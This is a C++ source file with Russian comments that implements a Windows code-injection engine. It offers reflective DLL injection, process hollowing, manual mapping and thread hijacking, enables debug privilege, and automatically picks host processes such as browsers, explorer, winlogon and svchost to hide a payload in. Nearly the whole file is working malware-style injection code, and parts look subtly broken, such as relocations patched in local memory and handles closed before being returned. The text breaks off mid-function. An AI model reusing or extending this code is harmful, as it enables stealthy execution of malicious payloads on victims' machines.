#include "code_injection.h"
#include "../logger/file_logger.h"
#include "../common.h"
#include <tlhelp32.h>
#include <psapi.h>
#include <winternl.h>
#include <ntstatus.h>
#include <vector>
#include <memory>
#include <algorithm>

// Define missing structures if not available
#ifndef PROCESSENTRY32A
typedef struct tagPROCESSENTRY32A {
    DWORD dwSize;
    DWORD cntUsage;
    DWORD th32ProcessID;
    ULONG_PTR th32DefaultHeapID;
    DWORD th32ModuleID;
    DWORD cntThreads;
    DWORD th32ParentProcessID;
    LONG pcPriClassBase;
    DWORD dwFlags;
    CHAR szExeFile[MAX_PATH];
} PROCESSENTRY32A;
#endif

#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "psapi.lib")

typedef NTSTATUS(NTAPI* pNtUnmapViewOfSection)(HANDLE, PVOID);
typedef NTSTATUS(NTAPI* pNtWriteVirtualMemory)(HANDLE, PVOID, PVOID, ULONG, PULONG);
typedef NTSTATUS(NTAPI* pNtReadVirtualMemory)(HANDLE, PVOID, PVOID, ULONG, PULONG);
typedef NTSTATUS(NTAPI* pNtQueryInformationProcess)(HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG);

extern void LogInfo(const char* message);
extern void LogError(const char* message);
extern void LogDebug(const char* message);
extern void LogWarning(const char* message);

// Глобальный инжектор
std::unique_ptr<CodeInjector> g_codeInjector;

CodeInjector::CodeInjector() : lastCacheUpdate_(0) {
    // Инициализация списка предпочитаемых процессов
    targetProcesses_ = {
        {"explorer.exe", 30},
        {"chrome.exe", 50},
        {"firefox.exe", 50},
        {"msedge.exe", 50},
        {"notepad.exe", 20},
        {"calc.exe", 20},
        {"dwm.exe", 25},
        {"winlogon.exe", 15},
        {"svchost.exe", 10}
    };
    
    EnableDebugPrivilege();
    LogInfo("CodeInjector инициализирован");
}

CodeInjector::~CodeInjector() {
    LogInfo("CodeInjector деинициализирован");
}

InjectionResult CodeInjector::InjectIntoProcess(const std::vector<uint8_t>& payload,
                                               InjectionType type,
                                               const std::string& targetProcess) {
    InjectionResult result;
    
    DWORD targetPID = 0;
    if (!targetProcess.empty()) {
        std::vector<DWORD> pids = FindProcessesByName(targetProcess);
        if (!pids.empty()) {
            targetPID = pids[0];
        }
    } else {
        targetPID = FindBestTargetProcess();
    }
    
    if (targetPID == 0) {
        result.errorMessage = "Не найден подходящий процесс для инъекции";
        LogError("Не найден целевой процесс для инъекции");
        return result;
    }
    
    LogInjectionAttempt(type, targetPID, false);
    
    switch (type) {
        case InjectionType::REFLECTIVE_DLL:
            return ReflectiveDLLInjection(payload, targetPID);
        case InjectionType::PROCESS_HOLLOWING:
            return ProcessHollowing(payload, GetProcessPath(targetPID));
        case InjectionType::MANUAL_MAP:
            return ManualMapInjection(payload, targetPID);
        case InjectionType::THREAD_HIJACKING:
            return ThreadHijacking(payload, targetPID);
        default:
            result.errorMessage = "Неподдерживаемый тип инъекции";
            LogError("Неподдерживаемый тип инъекции");
            return result;
    }
}

InjectionResult CodeInjector::ReflectiveDLLInjection(const std::vector<uint8_t>& dllData, DWORD targetPID) {
    InjectionResult result;
    
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPID);
    if (!hProcess) {
        result.errorMessage = "Не удалось открыть целевой процесс";
        LogError("Ошибка открытия процесса для Reflective DLL инъекции");
        return result;
    }
    
    // Поиск Reflective Loader
    LPVOID loaderAddr = FindReflectiveLoader(dllData);
    if (!loaderAddr) {
        result.errorMessage = "Не найден Reflective Loader в DLL";
        CloseHandle(hProcess);
        return result;
    }
    
    // Выделение памяти в целевом процессе
    SIZE_T dllSize = dllData.size();
    LPVOID remoteMemory = VirtualAllocEx(hProcess, NULL, dllSize,
                                        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remoteMemory) {
        result.errorMessage = "Ошибка выделения памяти в целевом процессе";
        CloseHandle(hProcess);
        return result;
    }
    
    // Запись DLL в память процесса
    SIZE_T written;
    if (!WriteProcessMemory(hProcess, remoteMemory, dllData.data(), dllSize, &written)) {
        result.errorMessage = "Ошибка записи DLL в память процесса";
        VirtualFreeEx(hProcess, remoteMemory, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return result;
    }
    
    // Вычисление адреса точки входа
    LPVOID entryPoint = (LPVOID)((DWORD_PTR)remoteMemory + (DWORD_PTR)loaderAddr);
    
    // Создание удаленного потока
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0,
                                       (LPTHREAD_START_ROUTINE)entryPoint,
                                       remoteMemory, 0, NULL);
    if (!hThread) {
        result.errorMessage = "Ошибка создания удаленного потока";
        VirtualFreeEx(hProcess, remoteMemory, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return result;
    }
    
    WaitForSingleObject(hThread, 5000);
    CloseHandle(hThread);
    CloseHandle(hProcess);
    
    result.success = true;
    result.processId = targetPID;
    result.baseAddress = remoteMemory;
    result.imageSize = dllSize;
    
    LogInfo("Reflective DLL инъекция выполнена успешно");
    return result;
}

InjectionResult CodeInjector::ProcessHollowing(const std::vector<uint8_t>& payload, const std::string& targetPath) {
    InjectionResult result;
    
    // Парсинг PE
    PEInfo peInfo;
    if (!ParsePE(payload, peInfo)) {
        result.errorMessage = "Некорректный PE файл";
        return result;
    }
    
    // Создание приостановленного процесса
    STARTUPINFOA si = {sizeof(si)};
    PROCESS_INFORMATION pi = {0};
    
    if (!CreateProcessA(targetPath.c_str(), NULL, NULL, NULL, FALSE,
                       CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        result.errorMessage = "Ошибка создания целевого процесса";
        return result;
    }
    
    // Размаппинг оригинального образа
    HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
    pNtUnmapViewOfSection NtUnmapViewOfSection = 
        (pNtUnmapViewOfSection)GetProcAddress(hNtdll, "NtUnmapViewOfSection");
    
    if (NtUnmapViewOfSection) {
        // Получение базового адреса через PEB
        PROCESS_BASIC_INFORMATION pbi;
        pNtQueryInformationProcess NtQueryInformationProcess = 
            (pNtQueryInformationProcess)GetProcAddress(hNtdll, "NtQueryInformationProcess");
        
        if (NtQueryInformationProcess) {
            NTSTATUS status = NtQueryInformationProcess(pi.hProcess, ProcessBasicInformation,
                                                       &pbi, sizeof(pbi), NULL);
            if (status == STATUS_SUCCESS) {
                PEB peb;
                SIZE_T read;
                if (ReadProcessMemory(pi.hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), &read)) {
                    // Use the correct field from PEB for image base address
                    NtUnmapViewOfSection(pi.hProcess, (PVOID)(ULONG_PTR)peb.Reserved3[1]);
                }
            }
        }
    }
    
    // Выделение памяти для нового образа
    LPVOID imageBase = VirtualAllocEx(pi.hProcess,
                                     (LPVOID)peInfo.ntHeaders->OptionalHeader.ImageBase,
                                     peInfo.imageSize,
                                     MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    
    if (!imageBase) {
        imageBase = VirtualAllocEx(pi.hProcess, NULL, peInfo.imageSize,
                                  MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    }
    
    if (!imageBase) {
        result.errorMessage = "Ошибка выделения памяти для образа";
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return result;
    }
    
    // Запись заголовков
    SIZE_T written;
    if (!WriteProcessMemory(pi.hProcess, imageBase, payload.data(),
                           peInfo.ntHeaders->OptionalHeader.SizeOfHeaders, &written)) {
        result.errorMessage = "Ошибка записи заголовков";
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return result;
    }
    
    // Запись секций
    PIMAGE_SECTION_HEADER sectionHeader = IMAGE_FIRST_SECTION(peInfo.ntHeaders);
    for (int i = 0; i < peInfo.ntHeaders->FileHeader.NumberOfSections; i++) {
        if (sectionHeader[i].SizeOfRawData > 0) {
            LPVOID sectionDest = (LPVOID)((DWORD_PTR)imageBase + sectionHeader[i].VirtualAddress);
            const uint8_t* sectionSrc = payload.data() + sectionHeader[i].PointerToRawData;
            
            if (!WriteProcessMemory(pi.hProcess, sectionDest, sectionSrc,
                                   sectionHeader[i].SizeOfRawData, &written)) {
                result.errorMessage = "Ошибка записи секции";
                TerminateProcess(pi.hProcess, 0);
                CloseHandle(pi.hProcess);
                CloseHandle(pi.hThread);
                return result;
            }
        }
    }
    
    // Исправление импортов и релокаций
    FixImports(imageBase, peInfo, pi.hProcess);
    ApplyRelocations(imageBase, peInfo, (LPVOID)peInfo.ntHeaders->OptionalHeader.ImageBase);
    
    // Патчинг точки входа
    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_INTEGER;
    GetThreadContext(pi.hThread, &ctx);
    
#ifdef _WIN64
    ctx.Rcx = (DWORD64)imageBase + peInfo.ntHeaders->OptionalHeader.AddressOfEntryPoint;
#else
    ctx.Eax = (DWORD)imageBase + peInfo.ntHeaders->OptionalHeader.AddressOfEntryPoint;
#endif
    
    SetThreadContext(pi.hThread, &ctx);
    ResumeThread(pi.hThread);
    
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    
    result.success = true;
    result.processId = pi.dwProcessId;
    result.processHandle = pi.hProcess;
    result.threadHandle = pi.hThread;
    result.baseAddress = imageBase;
    result.imageSize = peInfo.imageSize;
    
    LogInfo("Process Hollowing выполнен успешно");
    return result;
}

InjectionResult CodeInjector::ManualMapInjection(const std::vector<uint8_t>& dllData, DWORD targetPID) {
    InjectionResult result;
    
    // Парсинг PE
    PEInfo peInfo;
    if (!ParsePE(dllData, peInfo)) {
        result.errorMessage = "Некорректный PE файл";
        return result;
    }
    
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPID);
    if (!hProcess) {
        result.errorMessage = "Не удалось открыть целевой процесс";
        return result;
    }
    
    // Выделение памяти для образа
    LPVOID imageBase = VirtualAllocEx(hProcess, NULL, peInfo.imageSize,
                                     MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!imageBase) {
        result.errorMessage = "Ошибка выделения памяти для образа";
        CloseHandle(hProcess);
        return result;
    }
    
    // Копирование заголовков
    SIZE_T written;
    if (!WriteProcessMemory(hProcess, imageBase, dllData.data(),
                           peInfo.ntHeaders->OptionalHeader.SizeOfHeaders, &written)) {
        result.errorMessage = "Ошибка копирования заголовков";
        VirtualFreeEx(hProcess, imageBase, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return result;
    }
    
    // Копирование секций
    PIMAGE_SECTION_HEADER sectionHeader = IMAGE_FIRST_SECTION(peInfo.ntHeaders);
    for (int i = 0; i < peInfo.ntHeaders->FileHeader.NumberOfSections; i++) {
        if (sectionHeader[i].SizeOfRawData > 0) {
            LPVOID sectionDest = (LPVOID)((DWORD_PTR)imageBase + sectionHeader[i].VirtualAddress);
            const uint8_t* sectionSrc = dllData.data() + sectionHeader[i].PointerToRawData;
            
            if (!WriteProcessMemory(hProcess, sectionDest, sectionSrc,
                                   sectionHeader[i].SizeOfRawData, &written)) {
                result.errorMessage = "Ошибка копирования секции";
                VirtualFreeEx(hProcess, imageBase, 0, MEM_RELEASE);
                CloseHandle(hProcess);
                return result;
            }
        }
    }
    
    // Исправление импортов
    if (!FixImports(imageBase, peInfo, hProcess)) {
        result.errorMessage = "Ошибка исправления импортов";
        VirtualFreeEx(hProcess, imageBase, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return result;
    }
    
    // Применение релокаций
    if (!ApplyRelocations(imageBase, peInfo, (LPVOID)peInfo.ntHeaders->OptionalHeader.ImageBase)) {
        result.errorMessage = "Ошибка применения релокаций";
        VirtualFreeEx(hProcess, imageBase, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return result;
    }
    
    // Выполнение точки входа
    LPVOID entryPoint = (LPVOID)((DWORD_PTR)imageBase + peInfo.ntHeaders->OptionalHeader.AddressOfEntryPoint);
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0,
                                       (LPTHREAD_START_ROUTINE)entryPoint,
                                       imageBase, 0, NULL);
    if (!hThread) {
        result.errorMessage = "Ошибка создания удаленного потока";
        VirtualFreeEx(hProcess, imageBase, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return result;
    }
    
    CloseHandle(hThread);
    CloseHandle(hProcess);
    
    result.success = true;
    result.processId = targetPID;
    result.baseAddress = imageBase;
    result.imageSize = peInfo.imageSize;
    
    LogInfo("Manual Map инъекция выполнена успешно");
    return result;
}

InjectionResult CodeInjector::ThreadHijacking(const std::vector<uint8_t>& shellcode, DWORD targetPID) {
    InjectionResult result;
    
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPID);
    if (!hProcess) {
        result.errorMessage = "Не удалось открыть целевой процесс";
        return result;
    }
    
    // Поиск подходящего потока
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        result.errorMessage = "Ошибка создания снимка потоков";
        CloseHandle(hProcess);
        return result;
    }
    
    THREADENTRY32 te32;
    te32.dwSize = sizeof(THREADENTRY32);
    
    DWORD targetThreadId = 0;
    if (Thread32First(hSnapshot, &te32)) {
        do {
            if (te32.th32OwnerProcessID == targetPID) {
                targetThreadId = te32.th32ThreadID;
                break;
            }
        } while (Thread32Next(hSnapshot, &te32));
    }
    
    CloseHandle(hSnapshot);
    
    if (targetThreadId == 0) {
        result.errorMessage = "Не найден подходящий поток";
        CloseHandle(hProcess);
        return result;
    }
    
    HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, targetThreadId);
    if (!hThread) {
        result.errorMessage = "Ошибка открытия потока";
        CloseHandle(hProcess);
        return result;
    }
    
    // Приостановка потока
    if (SuspendThread(hThread) == -1) {
        result.errorMessage = "Ошибка приостановки потока";
        CloseHandle(hThread);
        CloseHandle(hProcess);
        return result;
    }
    
    // Получение контекста потока
    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_FULL;
    if (!GetThreadContext(hThread, &ctx)) {
        result.errorMessage = "Ошибка получения контекста потока";
        ResumeThread(hThread);
        CloseHandle(hThread);
        CloseHandle(hProcess);
        return result;
    }
    
    // Выделение памяти для шелл-кода
    LPVOID remoteMemory = VirtualAllocEx(hProcess, NULL, shellcode.size(),
                                        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remoteMemory) {
        result.errorMessage = "Ошибка выделения памяти";
        ResumeThread(hThread);
        CloseHandle(hThread);
        CloseHandle(hProcess);
        return result;
    }
    
    // Запись шелл-кода
    SIZE_T written;
    if (!WriteProcessMemory(hProcess, remoteMemory, shellcode.data(), shellcode.size(), &written)) {
        result.errorMessage = "Ошибка записи шелл-кода";
        VirtualFreeEx(hProcess, remoteMemory, 0, MEM_RELEASE);
        ResumeThread(hThread);
        CloseHandle(hThread);
        CloseHandle(hProcess);
        return result;
    }
    
    // Изменение контекста потока
#ifdef _WIN64
    ctx.Rip = (DWORD64)remoteMemory;
#else
    ctx.Eip = (DWORD)remoteMemory;
#endif
    
    if (!SetThreadContext(hThread, &ctx)) {
        result.errorMessage = "Ошибка установки контекста потока";
        VirtualFreeEx(hProcess, remoteMemory, 0, MEM_RELEASE);
        ResumeThread(hThread);
        CloseHandle(hThread);
        CloseHandle(hProcess);
        return result;
    }
    
    // Возобновление потока
    ResumeThread(hThread);
    CloseHandle(hThread);
    CloseHandle(hProcess);
    
    result.success = true;
    result.processId = targetPID;
    result.baseAddress = remoteMemory;
    result.imageSize = shellcode.size();
    
    LogInfo("Thread Hijacking выполнен успешно");
    return result;
}

DWORD CodeInjector::FindBestTargetProcess(const std::string& preferredName) {
    UpdateProcessCache();
    
    std::vector<DWORD> candidates;
    
    if (!preferredName.empty()) {
        candidates = FindProcessesByName(preferredName);
    } else {
        // Поиск среди предпочитаемых процессов
        for (const auto& target : targetProcesses_) {
            std::vector<DWORD> pids = FindProcessesByName(target.name);
            for (DWORD pid : pids) {
                if (IsProcessSuitable(pid)) {
                    candidates.push_back(pid);
                }
            }
        }
    }
    
    if (candidates.empty()) {
        LogWarning("Не найдено подходящих процессов для инъекции");
        return 0;
    }
    
    // Выбор лучшего кандидата на основе приоритета
    DWORD bestPID = candidates[0];
    int bestPriority = 0;
    
    for (DWORD pid : candidates) {
        std::string processName = GetProcessPath(pid);
        for (const auto& target : targetProcesses_) {
            if (processName.find(target.name) != std::string::npos) {
                if (target.priority > bestPriority) {
                    bestPriority = target.priority;
                    bestPID = pid;
                }
                break;
            }
        }
    }
    
    LogInfo("Выбран процесс для инъекции");
    return bestPID;
}

std::vector<DWORD> CodeInjector::FindProcessesByName(const std::string& processName) {
    std::vector<DWORD> processes;
    
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        return processes;
    }
    
    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);
    
    if (Process32First(hSnapshot, &pe32)) {
        do {
            // Convert wide string to multi-byte string
            char exeFileName[MAX_PATH];
            WideCharToMultiByte(CP_UTF8, 0, pe32.szExeFile, -1, exeFileName, MAX_PATH, NULL, NULL);
            if (std::string(exeFileName).find(processName) != std::string::npos) {
                processes.push_back(pe32.th32ProcessID);
            }
        } while (Process32Next(hSnapshot, &pe32));
    }
    
    CloseHandle(hSnapshot);
    return processes;
}

bool CodeInjector::IsProcessSuitable(DWORD processId) {
    if (processId == 0 || processId == 4 || processId == GetCurrentProcessId()) {
        return false;
    }
    
    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, processId);
    if (!hProcess) {
        return false;
    }
    
    // Проверка архитектуры
    BOOL isWow64 = FALSE;
    IsWow64Process(hProcess, &isWow64);
    
#ifdef _WIN64
    bool archMatch = !isWow64;
#else
    bool archMatch = isWow64 || Is64BitProcess(processId);
#endif
    
    CloseHandle(hProcess);
    
    return archMatch && IsProcessInSameSession(processId) && !ProcessUtils::IsSystemProcess(processId);
}

void CodeInjector::UpdateProcessCache() {
    DWORD currentTime = GetTickCount();
    if (currentTime - lastCacheUpdate_ < 30000) { // 30 секунд
        return;
    }
    
    processCache_.clear();
    
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        return;
    }
    
    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);
    
    if (Process32First(hSnapshot, &pe32)) {
        do {
            // Convert wide string to multi-byte string
            char exeFileName[MAX_PATH];
            WideCharToMultiByte(CP_UTF8, 0, pe32.szExeFile, -1, exeFileName, MAX_PATH, NULL, NULL);
            std::string processName(exeFileName);
            processCache_[processName].push_back(pe32.th32ProcessID);
        } while (Process32Next(hSnapshot, &pe32));
    }
    
    CloseHandle(hSnapshot);
    lastCacheUpdate_ = currentTime;
}

bool CodeInjector::ParsePE(const std::vector<uint8_t>& data, PEInfo& peInfo) {
    if (data.size() < sizeof(IMAGE_DOS_HEADER)) {
        return false;
    }
    
    peInfo.rawData = data;
    peInfo.dosHeader = (PIMAGE_DOS_HEADER)data.data();
    
    if (peInfo.dosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
        return false;
    }
    
    if (data.size() < peInfo.dosHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS)) {
        return false;
    }
    
    peInfo.ntHeaders = (PIMAGE_NT_HEADERS)(data.data() + peInfo.dosHeader->e_lfanew);
    
    if (peInfo.ntHeaders->Signature != IMAGE_NT_SIGNATURE) {
        return false;
    }
    
    peInfo.imageSize = peInfo.ntHeaders->OptionalHeader.SizeOfImage;
    peInfo.entryPoint = peInfo.ntHeaders->OptionalHeader.AddressOfEntryPoint;
    
#ifdef _WIN64
    peInfo.is64Bit = (peInfo.ntHeaders->FileHeader.Machine == IMAGE_FILE_MACHINE_AMD64);
#else
    peInfo.is64Bit = false;
#endif
    
    // Заполнение информации о секциях
    PIMAGE_SECTION_HEADER sectionHeader = IMAGE_FIRST_SECTION(peInfo.ntHeaders);
    for (int i = 0; i < peInfo.ntHeaders->FileHeader.NumberOfSections; i++) {
        peInfo.sections.push_back(&sectionHeader[i]);
    }
    
    return true;
}

bool CodeInjector::FixImports(LPVOID baseAddress, const PEInfo& peInfo, HANDLE targetProcess) {
    DWORD importRVA = peInfo.ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress;
    if (importRVA == 0) {
        return true; // Нет импортов
    }
    
    PIMAGE_IMPORT_DESCRIPTOR importDesc = (PIMAGE_IMPORT_DESCRIPTOR)(peInfo.rawData.data() + importRVA);
    
    while (importDesc->Name) {
        const char* moduleName = (const char*)(peInfo.rawData.data() + importDesc->Name);
        HMODULE hModule = LoadLibraryA(moduleName);
        
        if (hModule) {
            PIMAGE_THUNK_DATA thunk = (PIMAGE_THUNK_DATA)(peInfo.rawData.data() + importDesc->FirstThunk);
            PIMAGE_THUNK_DATA origThunk = (PIMAGE_THUNK_DATA)(peInfo.rawData.data() + 
                (importDesc->OriginalFirstThunk ? importDesc->OriginalFirstThunk : importDesc->FirstThunk));
            
            while (thunk->u1.AddressOfData) {
                FARPROC procAddress = NULL;
                
                if (origThunk->u1.Ordinal & IMAGE_ORDINAL_FLAG) {
                    // Импорт по ординалу
                    procAddress = GetProcAddress(hModule, (LPCSTR)(origThunk->u1.Ordinal & 0xFFFF));
                } else {
                    // Импорт по имени
                    PIMAGE_IMPORT_BY_NAME importByName = (PIMAGE_IMPORT_BY_NAME)
                        (peInfo.rawData.data() + origThunk->u1.AddressOfData);
                    procAddress = GetProcAddress(hModule, importByName->Name);
                }
                
                if (procAddress) {
                    LPVOID thunkAddr = (LPVOID)((DWORD_PTR)baseAddress + 
                                               ((DWORD_PTR)thunk - (DWORD_PTR)peInfo.rawData.data()));
                    SIZE_T written;
                    WriteProcessMemory(targetProcess, thunkAddr, &procAddress, sizeof(procAddress), &written);
                }
                
                thunk++;
                origThunk++;
            }
        }
        
        importDesc++;
    }
    
    return true;
}

bool CodeInjector::ApplyRelocations(LPVOID baseAddress, const PEInfo& peInfo, LPVOID preferredBase) {
    DWORD_PTR delta = (DWORD_PTR)baseAddress - (DWORD_PTR)preferredBase;
    if (delta == 0) {
        return true; // Релокации не нужны
    }
    
    DWORD relocRVA = peInfo.ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress;
    if (relocRVA == 0) {
        return true; // Нет релокаций
    }
    
    PIMAGE_BASE_RELOCATION reloc = (PIMAGE_BASE_RELOCATION)(peInfo.rawData.data() + relocRVA);
    
    while (reloc->VirtualAddress) {
        WORD* relocData = (WORD*)((DWORD_PTR)reloc + sizeof(IMAGE_BASE_RELOCATION));
        int numEntries = (reloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
        
        for (int i = 0; i < numEntries; i++) {
            WORD relocType = relocData[i] >> 12;
            WORD relocOffset = relocData[i] & 0xFFF;
            
            if (relocType == IMAGE_REL_BASED_HIGHLOW || relocType == IMAGE_REL_BASED_DIR64) {
                DWORD_PTR* patchAddr = (DWORD_PTR*)((DWORD_PTR)baseAddress + reloc->VirtualAddress + relocOffset);
                *patchAddr += delta;
            }
        }
        
        reloc = (PIMAGE_BASE_RELOCATION)((DWORD_PTR)reloc + reloc->SizeOfBlock);
    }
    
    return true;
}

bool CodeInjector::EnableDebugPrivilege() {
    HANDLE hToken;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        return false;
    }
    
    TOKEN_PRIVILEGES tp;
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    
    if (!LookupPrivilegeValueA(NULL, "SeDebugPrivilege", &tp.Privileges[0].Luid)) {
        CloseHandle(hToken);
        return false;
    }
    
    bool result = AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL) != 0;
    CloseHandle(hToken);
    
    return result;
}

bool CodeInjector::Is64BitProcess(DWORD processId) {
    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, processId);
    if (!hProcess) {
        return false;
    }
    
    BOOL isWow64 = FALSE;
    bool result = IsWow64Process(hProcess, &isWow64) && !isWow64;
    CloseHandle(hProcess);
    
    return result;
}

std::string CodeInjector::GetProcessPath(DWORD processId) {
    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, processId);
    if (!hProcess) {
        return "";
    }
    
    char imagePath[MAX_PATH];
    DWORD pathLength = sizeof(imagePath);
    
    if (QueryFullProcessImageNameA(hProcess, 0, imagePath, &pathLength)) {
        CloseHandle(hProcess);
        return std::string(imagePath);
    }
    
    CloseHandle(hProcess);
    return "";
}

bool CodeInjector::IsProcessInSameSession(DWORD processId) {
    DWORD currentSessionId = 0;
    ProcessIdToSessionId(GetCurrentProcessId(), &currentSessionId);
    
    DWORD targetSessionId = 0;
    ProcessIdToSessionId(processId, &targetSessionId);
    
    return currentSessionId == targetSessionId;
}

LPVOID CodeInjector::FindReflectiveLoader(const std::vector<uint8_t>& dllData) {
    PEInfo peInfo;
    if (!ParsePE(dllData, peInfo)) {
        return NULL;
    }
    
    DWORD exportRVA = peInfo.ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    if (exportRVA == 0) {
        return NULL;
    }
    
    PIMAGE_EXPORT_DIRECTORY exportDir = (PIMAGE_EXPORT_DIRECTORY)(dllData.data() + exportRVA);
    DWORD* nameTable = (DWORD*)(dllData.data() + exportDir->AddressOfNames);
    WORD* ordinalTable = (WORD*)(dllData.data() + exportDir->AddressOfNameOrdinals);
    DWORD* addressTable = (DWORD*)(dllData.data() + exportDir->AddressOfFunctions);
    
    for (DWORD i = 0; i < exportDir->NumberOfNames; i++) {
        const char* functionName = (const char*)(dllData.data() + nameTable[i]);
        if (strcmp(functionName, "ReflectiveLoader") == 0) {
            return (LPVOID)(DWORD_PTR)addressTable[ordinalTable[i]];
        }
    }
    
    return NULL;
}

void CodeInjector::LogInjectionAttempt(InjectionType type, DWORD targetPID, bool success) {
    std::string typeStr = InjectionTypeToString(type);
    if (success) {
        LogInfo(("Успешная инъекция " + typeStr + " в процесс " + std::to_string(targetPID)).c_str());
    } else {
        LogInfo(("Попытка инъекции " + typeStr + " в процесс " + std::to_string(targetPID)).c_str());
    }
}

std::string CodeInjector::InjectionTypeToString(InjectionType type) {
    switch (type) {
        case InjectionType::REFLECTIVE_DLL: return "Reflective DLL";
        case InjectionType::PROCESS_HOLLOWING: return "Process Hollowing";
        case InjectionType::MANUAL_MAP: return "Manual Map";
        case InjectionType::THREAD_HIJACKING: return "Thread Hijacking";
        case InjectionType::ATOM_BOMBING: return "Atom Bombing";
        case InjectionType::PROCESS_GHOSTING: return "Process Ghosting";
        default: return "Unknown";
    }
}

namespace ProcessUtils {

std::vector<DWORD> EnumerateProcesses() {
    std::vector<DWORD> processIds;
    DWORD processes[1024], needed, processCount;
    
    if (EnumProcesses(processes, sizeof(processes), &needed)) {
        processCount = needed / sizeof(DWORD);
        for (DWORD i = 0; i < processCount; i++) {
            if (processes[i] != 0) {
                processIds.push_back(processes[i]);
            }
        }
    }
    
    return processIds;
}

std::string GetProcessName(DWORD processId) {
    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, processId);
    if (!hProcess) {
        return "";
    }
    
    char processName[MAX_PATH] = {0};
    GetModuleBaseNameA(hProcess, NULL, processName, MAX_PATH);
    CloseHandle(hProcess);
    
    return std::string(processName);
}

std::string GetProcessImagePath(DWORD processId) {
    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, processId);
    if (!hProcess) {
        return "";
    }
    
    char imagePath[MAX_PATH];
    DWORD pathLength = sizeof(imagePath);
    
    if (QueryFullProcessImageNameA(hProcess, 0, imagePath, &pathLength)) {
        CloseHandle(hProcess);
        return std::string(imagePath);
    }
    
    CloseHandle(hProcess);
    return "";
}

bool IsProcessElevated(DWORD processId) {
    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, processId);
    if (!hProcess) {
        return true; // Assume elevated if can't check
    }
    
    HANDLE hToken;
    if (!OpenProcessToken(hProcess, TOKEN_QUERY, &hToken)) {
        CloseHandle(hProcess);
        return true;
    }
    
    TOKEN_ELEVATION elevation;
    DWORD size;
    bool isElevated = true;
    
    if (GetTokenInformation(hToken, TokenElevation, &elevation, sizeof(elevation), &size)) {
        isElevated = elevation.TokenIsElevated != 0;
    }
    
    CloseHandle(hToken);
    CloseHandle(hProcess);
    return isElevated;
}

bool IsSystemProcess(DWORD processId) {
    if (processId == 0 || processId == 4) {
        return true;
    }
    
    std::string imagePath = GetProcessImagePath(processId);
    if (imagePath.empty()) {
        return true;
    }
    
    std::transform(imagePath.begin(), imagePath.end(), imagePath.begin(), ::tolower);
    
    std::vector<std::string> systemPaths = {
        "\\system32\\", "\\syswow64\\", "\\windows\\",
        "csrss.exe", "winlogon.exe", "services.exe", "lsass.exe"
    };
    
    for (const auto& path : systemPaths) {
        if (imagePath.find(path) != std::string::npos) {
            return true;
        }
    }
    
    return false;
}

DWORD GetProcessSessionId(DWORD processId) {
    DWORD sessionId = 0;
    ProcessIdToSessionId(processId, &sessionId);
    return sessionId;
}

bool IsProcessSuspicious(DWORD processId) {
    std::string imagePath = GetProcessImagePath(processId);
    if (imagePath.empty()) {
        return true;
    }
    
